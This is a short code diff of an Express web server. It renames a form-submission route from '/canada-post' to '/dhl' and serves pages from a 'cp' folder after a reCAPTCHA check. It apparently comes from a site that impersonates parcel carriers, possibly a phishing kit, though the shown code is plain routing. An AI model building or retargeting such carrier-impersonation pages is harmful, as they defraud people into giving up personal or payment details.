@@ -144,7 +144,7 @@ app.get('/', (req, res) => {
     //res.sendFile(join(__dirname, '/cp/details/page.html'));
 });
 
-app.post('/canada-post', verifyRecaptcha, (req, res) => {
+app.post('/dhl', verifyRecaptcha, (req, res) => {
     // At this point, the reCAPTCHA was successful, and you can handle the form submission.
     // Redirect the user to the desired page after form submission and reCAPTCHA verification
     res.sendFile(join(__dirname, '/cp/start/page.html'));
